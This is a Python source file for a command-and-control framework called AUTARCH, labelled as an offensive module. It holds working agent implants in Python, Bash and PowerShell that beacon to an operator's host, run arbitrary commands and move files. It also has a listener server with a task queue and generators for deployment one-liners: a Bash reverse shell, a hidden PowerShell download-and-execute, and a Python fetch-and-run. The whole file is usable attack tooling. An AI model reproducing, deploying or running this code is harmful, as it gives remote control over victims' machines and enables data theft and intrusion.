"""AUTARCH C2 Framework

Multi-session command & control framework with agent generation,
listener management, task queuing, and file transfer.
"""

DESCRIPTION = "Command & Control framework"
AUTHOR = "darkHal"
VERSION = "1.0"
CATEGORY = "offense"

import os
import re
import json
import time
import socket
import base64
import secrets
import threading
import struct
from pathlib import Path
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field

try:
    from core.paths import get_data_dir
except ImportError:
    def get_data_dir():
        return str(Path(__file__).parent.parent / 'data')


# ── Agent Templates ───────────────────────────────────────────────────────────

PYTHON_AGENT_TEMPLATE = '''#!/usr/bin/env python3
"""AUTARCH C2 Agent — auto-generated."""
import os,sys,time,socket,subprocess,json,base64,platform,random
C2_HOST="{host}"
C2_PORT={port}
BEACON_INTERVAL={interval}
JITTER={jitter}
AGENT_ID="{agent_id}"

def beacon():
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((C2_HOST,C2_PORT))
            # Register
            info={{"id":AGENT_ID,"os":platform.system(),"hostname":socket.gethostname(),
                "user":os.getenv("USER",os.getenv("USERNAME","unknown")),
                "pid":os.getpid(),"arch":platform.machine()}}
            s.send(json.dumps({{"type":"register","data":info}}).encode()+"\\n".encode())
            while True:
                data=s.recv(65536)
                if not data:break
                try:
                    cmd=json.loads(data.decode())
                    result=handle_cmd(cmd)
                    s.send(json.dumps(result).encode()+"\\n".encode())
                except:pass
        except:pass
        finally:
            try:s.close()
            except:pass
        jitter_delay=BEACON_INTERVAL+random.uniform(-JITTER,JITTER)
        time.sleep(max(1,jitter_delay))

def handle_cmd(cmd):
    t=cmd.get("type","")
    if t=="exec":
        try:
            r=subprocess.run(cmd["command"],shell=True,capture_output=True,text=True,timeout=60)
            return{{"type":"result","task_id":cmd.get("task_id",""),"stdout":r.stdout[-4096:],"stderr":r.stderr[-2048:],"rc":r.returncode}}
        except Exception as e:
            return{{"type":"error","task_id":cmd.get("task_id",""),"error":str(e)}}
    elif t=="download":
        try:
            with open(cmd["path"],"rb") as f:d=base64.b64encode(f.read()).decode()
            return{{"type":"file","task_id":cmd.get("task_id",""),"name":os.path.basename(cmd["path"]),"data":d}}
        except Exception as e:
            return{{"type":"error","task_id":cmd.get("task_id",""),"error":str(e)}}
    elif t=="upload":
        try:
            with open(cmd["path"],"wb") as f:f.write(base64.b64decode(cmd["data"]))
            return{{"type":"result","task_id":cmd.get("task_id",""),"stdout":"Uploaded to "+cmd["path"]}}
        except Exception as e:
            return{{"type":"error","task_id":cmd.get("task_id",""),"error":str(e)}}
    elif t=="sysinfo":
        return{{"type":"result","task_id":cmd.get("task_id",""),
            "stdout":json.dumps({{"os":platform.system(),"release":platform.release(),
            "hostname":socket.gethostname(),"user":os.getenv("USER",os.getenv("USERNAME","")),
            "pid":os.getpid(),"cwd":os.getcwd(),"arch":platform.machine()}})}}
    elif t=="exit":
        sys.exit(0)
    return{{"type":"error","task_id":cmd.get("task_id",""),"error":"Unknown command"}}

if __name__=="__main__":beacon()
'''

BASH_AGENT_TEMPLATE = '''#!/bin/bash
# AUTARCH C2 Agent — auto-generated
C2_HOST="{host}"
C2_PORT={port}
INTERVAL={interval}
AGENT_ID="{agent_id}"
while true; do
    exec 3<>/dev/tcp/$C2_HOST/$C2_PORT 2>/dev/null
    if [ $? -eq 0 ]; then
        echo '{{"type":"register","data":{{"id":"'$AGENT_ID'","os":"'$(uname -s)'","hostname":"'$(hostname)'","user":"'$(whoami)'","pid":'$$'}}}}' >&3
        while read -r line <&3; do
            CMD=$(echo "$line" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('command',''))" 2>/dev/null)
            TID=$(echo "$line" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('task_id',''))" 2>/dev/null)
            if [ -n "$CMD" ]; then
                OUTPUT=$(eval "$CMD" 2>&1 | head -c 4096)
                echo '{{"type":"result","task_id":"'$TID'","stdout":"'$(echo "$OUTPUT" | base64 -w0)'"}}' >&3
            fi
        done
        exec 3>&-
    fi
    sleep $INTERVAL
done
'''

POWERSHELL_AGENT_TEMPLATE = '''# AUTARCH C2 Agent — auto-generated
$C2Host="{host}"
$C2Port={port}
$Interval={interval}
$AgentId="{agent_id}"
while($true){{
    try{{
        $c=New-Object System.Net.Sockets.TcpClient($C2Host,$C2Port)
        $s=$c.GetStream()
        $w=New-Object System.IO.StreamWriter($s)
        $r=New-Object System.IO.StreamReader($s)
        $info=@{{type="register";data=@{{id=$AgentId;os="Windows";hostname=$env:COMPUTERNAME;user=$env:USERNAME;pid=$PID}}}}|ConvertTo-Json -Compress
        $w.WriteLine($info);$w.Flush()
        while($c.Connected){{
            $line=$r.ReadLine()
            if($line){{
                $cmd=$line|ConvertFrom-Json
                if($cmd.type -eq "exec"){{
                    try{{$out=Invoke-Expression $cmd.command 2>&1|Out-String
                        $resp=@{{type="result";task_id=$cmd.task_id;stdout=$out.Substring(0,[Math]::Min($out.Length,4096))}}|ConvertTo-Json -Compress
                    }}catch{{$resp=@{{type="error";task_id=$cmd.task_id;error=$_.Exception.Message}}|ConvertTo-Json -Compress}}
                    $w.WriteLine($resp);$w.Flush()
                }}
            }}
        }}
    }}catch{{}}
    Start-Sleep -Seconds $Interval
}}
'''


# ── C2 Server ─────────────────────────────────────────────────────────────────

@dataclass
class Agent:
    id: str
    os: str = ''
    hostname: str = ''
    user: str = ''
    pid: int = 0
    arch: str = ''
    remote_addr: str = ''
    first_seen: str = ''
    last_seen: str = ''
    status: str = 'active'  # active, stale, dead


@dataclass
class Task:
    id: str
    agent_id: str
    type: str
    data: dict = field(default_factory=dict)
    status: str = 'pending'  # pending, sent, completed, failed
    result: Optional[dict] = None
    created_at: str = ''
    completed_at: str = ''


class C2Server:
    """Multi-session C2 server with agent management."""

    def __init__(self):
        self._data_dir = os.path.join(get_data_dir(), 'c2')
        os.makedirs(self._data_dir, exist_ok=True)
        self._agents: Dict[str, Agent] = {}
        self._tasks: Dict[str, Task] = {}
        self._agent_tasks: Dict[str, list] = {}  # agent_id -> [task_ids]
        self._agent_sockets: Dict[str, socket.socket] = {}
        self._listeners: Dict[str, dict] = {}
        self._listener_threads: Dict[str, threading.Thread] = {}
        self._stop_events: Dict[str, threading.Event] = {}

    # ── Listener Management ───────────────────────────────────────────────

    def start_listener(self, name: str, host: str = '0.0.0.0',
                       port: int = 4444, protocol: str = 'tcp') -> dict:
        """Start a C2 listener."""
        if name in self._listeners:
            return {'ok': False, 'error': f'Listener "{name}" already exists'}

        stop_event = threading.Event()
        self._stop_events[name] = stop_event

        listener_info = {
            'name': name, 'host': host, 'port': port, 'protocol': protocol,
            'started_at': datetime.now(timezone.utc).isoformat(),
            'connections': 0,
        }
        self._listeners[name] = listener_info

        def accept_loop():
            try:
                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.settimeout(2.0)
                srv.bind((host, port))
                srv.listen(20)
                listener_info['socket'] = srv

                while not stop_event.is_set():
                    try:
                        conn, addr = srv.accept()
                        listener_info['connections'] += 1
                        threading.Thread(target=self._handle_agent,
                                         args=(conn, addr, name),
                                         daemon=True).start()
                    except socket.timeout:
                        continue
                    except Exception:
                        break
            except Exception as e:
                listener_info['error'] = str(e)
            finally:
                try:
                    srv.close()
                except Exception:
                    pass

        t = threading.Thread(target=accept_loop, daemon=True)
        t.start()
        self._listener_threads[name] = t

        return {'ok': True, 'message': f'Listener "{name}" started on {host}:{port}'}

    def stop_listener(self, name: str) -> dict:
        """Stop a C2 listener."""
        if name not in self._listeners:
            return {'ok': False, 'error': 'Listener not found'}
        stop_event = self._stop_events.pop(name, None)
        if stop_event:
            stop_event.set()
        listener = self._listeners.pop(name, {})
        sock = listener.get('socket')
        if sock:
            try:
                sock.close()
            except Exception:
                pass
        self._listener_threads.pop(name, None)
        return {'ok': True, 'message': f'Listener "{name}" stopped'}

    def list_listeners(self) -> List[dict]:
        return [{k: v for k, v in l.items() if k != 'socket'}
                for l in self._listeners.values()]

    def _handle_agent(self, conn: socket.socket, addr: tuple, listener: str):
        """Handle incoming agent connection."""
        conn.settimeout(300)  # 5 min timeout
        try:
            data = conn.recv(65536)
            if not data:
                return
            msg = json.loads(data.decode().strip())
            if msg.get('type') != 'register':
                conn.close()
                return

            info = msg.get('data', {})
            agent_id = info.get('id', secrets.token_hex(4))

            agent = Agent(
                id=agent_id,
                os=info.get('os', ''),
                hostname=info.get('hostname', ''),
                user=info.get('user', ''),
                pid=info.get('pid', 0),
                arch=info.get('arch', ''),
                remote_addr=f'{addr[0]}:{addr[1]}',
                first_seen=datetime.now(timezone.utc).isoformat(),
                last_seen=datetime.now(timezone.utc).isoformat(),
            )

            self._agents[agent_id] = agent
            self._agent_sockets[agent_id] = conn
            if agent_id not in self._agent_tasks:
                self._agent_tasks[agent_id] = []

            # Process pending tasks for this agent
            while True:
                pending = [t for t in self._get_pending_tasks(agent_id)]
                if not pending:
                    time.sleep(1)
                    # Check if still connected
                    try:
                        conn.send(b'')
                    except Exception:
                        break
                    agent.last_seen = datetime.now(timezone.utc).isoformat()
                    continue

                for task in pending:
                    try:
                        cmd = {'type': task.type, 'task_id': task.id, **task.data}
                        conn.send(json.dumps(cmd).encode() + b'\n')
                        task.status = 'sent'

                        # Wait for result
                        conn.settimeout(60)
                        result_data = conn.recv(65536)
                        if result_data:
                            result = json.loads(result_data.decode().strip())
                            task.result = result
                            task.status = 'completed'
                            task.completed_at = datetime.now(timezone.utc).isoformat()
                        else:
                            task.status = 'failed'
                    except Exception as e:
                        task.status = 'failed'
                        task.result = {'error': str(e)}

                agent.last_seen = datetime.now(timezone.utc).isoformat()

        except Exception:
            pass
        finally:
            conn.close()
            # Mark agent as stale if no longer connected
            for aid, sock in list(self._agent_sockets.items()):
                if sock is conn:
                    self._agent_sockets.pop(aid, None)
                    if aid in self._agents:
                        self._agents[aid].status = 'stale'

    def _get_pending_tasks(self, agent_id: str) -> List[Task]:
        task_ids = self._agent_tasks.get(agent_id, [])
        return [self._tasks[tid] for tid in task_ids
                if tid in self._tasks and self._tasks[tid].status == 'pending']

    # ── Agent Management ──────────────────────────────────────────────────

    def list_agents(self) -> List[dict]:
        agents = []
        for a in self._agents.values():
            # Check if still connected
            connected = a.id in self._agent_sockets
            agents.append({
                'id': a.id, 'os': a.os, 'hostname': a.hostname,
                'user': a.user, 'pid': a.pid, 'arch': a.arch,
                'remote_addr': a.remote_addr,
                'first_seen': a.first_seen, 'last_seen': a.last_seen,
                'status': 'active' if connected else a.status,
            })
        return agents

    def remove_agent(self, agent_id: str) -> dict:
        if agent_id in self._agent_sockets:
            try:
                self._agent_sockets[agent_id].close()
            except Exception:
                pass
            del self._agent_sockets[agent_id]
        self._agents.pop(agent_id, None)
        self._agent_tasks.pop(agent_id, None)
        return {'ok': True}

    # ── Task Queue ────────────────────────────────────────────────────────

    def queue_task(self, agent_id: str, task_type: str,
                   data: dict = None) -> dict:
        """Queue a task for an agent."""
        if agent_id not in self._agents:
            return {'ok': False, 'error': 'Agent not found'}

        task_id = secrets.token_hex(4)
        task = Task(
            id=task_id,
            agent_id=agent_id,
            type=task_type,
            data=data or {},
            created_at=datetime.now(timezone.utc).isoformat(),
        )
        self._tasks[task_id] = task
        if agent_id not in self._agent_tasks:
            self._agent_tasks[agent_id] = []
        self._agent_tasks[agent_id].append(task_id)

        return {'ok': True, 'task_id': task_id}

    def execute_command(self, agent_id: str, command: str) -> dict:
        """Shortcut to queue an exec task."""
        return self.queue_task(agent_id, 'exec', {'command': command})

    def download_file(self, agent_id: str, remote_path: str) -> dict:
        return self.queue_task(agent_id, 'download', {'path': remote_path})

    def upload_file(self, agent_id: str, remote_path: str,
                    file_data: bytes) -> dict:
        encoded = base64.b64encode(file_data).decode()
        return self.queue_task(agent_id, 'upload',
                               {'path': remote_path, 'data': encoded})

    def get_task_result(self, task_id: str) -> dict:
        task = self._tasks.get(task_id)
        if not task:
            return {'ok': False, 'error': 'Task not found'}
        return {
            'ok': True,
            'task_id': task.id,
            'status': task.status,
            'result': task.result,
            'created_at': task.created_at,
            'completed_at': task.completed_at,
        }

    def list_tasks(self, agent_id: str = '') -> List[dict]:
        tasks = []
        for t in self._tasks.values():
            if agent_id and t.agent_id != agent_id:
                continue
            tasks.append({
                'id': t.id, 'agent_id': t.agent_id, 'type': t.type,
                'status': t.status, 'created_at': t.created_at,
                'completed_at': t.completed_at,
                'has_result': t.result is not None,
            })
        return tasks

    # ── Agent Generation ──────────────────────────────────────────────────

    def generate_agent(self, host: str, port: int = 4444,
                       agent_type: str = 'python',
                       interval: int = 5, jitter: int = 2) -> dict:
        """Generate a C2 agent payload."""
        agent_id = secrets.token_hex(4)

        if agent_type == 'python':
            code = PYTHON_AGENT_TEMPLATE.format(
                host=host, port=port, interval=interval,
                jitter=jitter, agent_id=agent_id)
        elif agent_type == 'bash':
            code = BASH_AGENT_TEMPLATE.format(
                host=host, port=port, interval=interval,
                agent_id=agent_id)
        elif agent_type == 'powershell':
            code = POWERSHELL_AGENT_TEMPLATE.format(
                host=host, port=port, interval=interval,
                agent_id=agent_id)
        else:
            return {'ok': False, 'error': f'Unknown agent type: {agent_type}'}

        # Save to file
        ext = {'python': 'py', 'bash': 'sh', 'powershell': 'ps1'}[agent_type]
        filename = f'agent_{agent_id}.{ext}'
        filepath = os.path.join(self._data_dir, filename)
        with open(filepath, 'w') as f:
            f.write(code)

        return {
            'ok': True,
            'agent_id': agent_id,
            'filename': filename,
            'filepath': filepath,
            'code': code,
            'type': agent_type,
        }

    # ── One-liners ────────────────────────────────────────────────────────

    def get_oneliner(self, host: str, port: int = 4444,
                     agent_type: str = 'python') -> dict:
        """Generate a one-liner to deploy the agent."""
        if agent_type == 'python':
            liner = (f"python3 -c \"import urllib.request,os,tempfile;"
                     f"f=tempfile.NamedTemporaryFile(suffix='.py',delete=False);"
                     f"f.write(urllib.request.urlopen('http://{host}:{port+1}/agent.py').read());"
                     f"f.close();os.system('python3 '+f.name+' &')\"")
        elif agent_type == 'bash':
            liner = f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1 &'"
        elif agent_type == 'powershell':
            liner = (f"powershell -nop -w hidden -c "
                     f"\"IEX(New-Object Net.WebClient).DownloadString"
                     f"('http://{host}:{port+1}/agent.ps1')\"")
        else:
            return {'ok': False, 'error': 'Unknown type'}

        return {'ok': True, 'oneliner': liner, 'type': agent_type}


# ── Singleton ─────────────────────────────────────────────────────────────────

_instance = None
_lock = threading.Lock()


def get_c2_server() -> C2Server:
    global _instance
    if _instance is None:
        with _lock:
            if _instance is None:
                _instance = C2Server()
    return _instance


# ── CLI ───────────────────────────────────────────────────────────────────────

def run():
    """Interactive CLI for C2 Framework."""
    svc = get_c2_server()

    while True:
        print("\n╔═══════════════════════════════════════╗")
        print("║       C2 FRAMEWORK                    ║")
        print("╠═══════════════════════════════════════╣")
        print("║  1 — Start Listener                   ║")
        print("║  2 — Stop Listener                    ║")
        print("║  3 — List Agents                      ║")
        print("║  4 — Interact with Agent              ║")
        print("║  5 — Generate Agent Payload           ║")
        print("║  6 — Get One-Liner                    ║")
        print("║  0 — Back                             ║")
        print("╚═══════════════════════════════════════╝")

        choice = input("\n  Select: ").strip()

        if choice == '0':
            break
        elif choice == '1':
            name = input("  Listener name: ").strip() or 'default'
            port = int(input("  Port (4444): ").strip() or '4444')
            r = svc.start_listener(name, port=port)
            print(f"  {r.get('message', r.get('error', ''))}")
        elif choice == '2':
            listeners = svc.list_listeners()
            if not listeners:
                print("  No listeners.")
                continue
            for l in listeners:
                print(f"  {l['name']} — {l['host']}:{l['port']} ({l['connections']} connections)")
            name = input("  Stop which: ").strip()
            if name:
                r = svc.stop_listener(name)
                print(f"  {r.get('message', r.get('error', ''))}")
        elif choice == '3':
            agents = svc.list_agents()
            if not agents:
                print("  No agents.")
                continue
            for a in agents:
                print(f"  [{a['status']:6s}] {a['id']} — {a['user']}@{a['hostname']} "
                      f"({a['os']}) from {a['remote_addr']}")
        elif choice == '4':
            aid = input("  Agent ID: ").strip()
            if not aid:
                continue
            print(f"  Interacting with {aid} (type 'exit' to return)")
            while True:
                cmd = input(f"  [{aid}]> ").strip()
                if cmd in ('exit', 'quit', ''):
                    break
                r = svc.execute_command(aid, cmd)
                if not r.get('ok'):
                    print(f"  Error: {r.get('error')}")
                    continue
                # Poll for result
                for _ in range(30):
                    time.sleep(1)
                    result = svc.get_task_result(r['task_id'])
                    if result.get('status') in ('completed', 'failed'):
                        if result.get('result'):
                            out = result['result'].get('stdout', '')
                            err = result['result'].get('stderr', '')
                            if out:
                                print(out)
                            if err:
                                print(f"  [stderr] {err}")
                        break
                else:
                    print("  [timeout] No response within 30s")
        elif choice == '5':
            host = input("  Callback host: ").strip()
            port = int(input("  Callback port (4444): ").strip() or '4444')
            atype = input("  Type (python/bash/powershell): ").strip() or 'python'
            r = svc.generate_agent(host, port, atype)
            if r.get('ok'):
                print(f"  Agent saved to: {r['filepath']}")
            else:
                print(f"  Error: {r.get('error')}")
        elif choice == '6':
            host = input("  Host: ").strip()
            port = int(input("  Port (4444): ").strip() or '4444')
            atype = input("  Type (python/bash/powershell): ").strip() or 'python'
            r = svc.get_oneliner(host, port, atype)
            if r.get('ok'):
                print(f"\n  {r['oneliner']}\n")
